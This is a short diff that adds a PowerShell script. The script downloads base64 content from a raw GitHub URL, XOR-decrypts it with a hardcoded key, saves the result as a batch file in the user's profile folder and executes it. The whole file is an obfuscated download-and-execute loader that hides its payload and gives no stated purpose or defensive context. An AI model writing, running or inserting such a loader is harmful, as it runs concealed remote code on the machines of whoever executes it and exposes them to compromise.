@@ -1,0 +1,21 @@
+$u='https://raw.githubusercontent.com/Jakeryan500/a/refs/heads/main/skibidi'
+$k='moon'
+
+$d = ((Invoke-WebRequest $u -UseBasicParsing).Content -replace '\s','')
+$b = [Convert]::FromBase64String($d)
+
+$kb = [Text.Encoding]::UTF8.GetBytes($k)
+if ($kb.Length -eq 0) { throw "Key is empty" }
+
+$out = New-Object byte[] $b.Length
+
+for ($i = 0; $i -lt $b.Length; $i++) {
+    $out[$i] = $b[$i] -bxor $kb[$i % $kb.Length]
+}
+
+$path = "$env:USERPROFILE\decrypted.bat"
+
+$text = [Text.Encoding]::UTF8.GetString($out)
+
+Set-Content -Path $path -Value $text
+Start-Process -FilePath $path
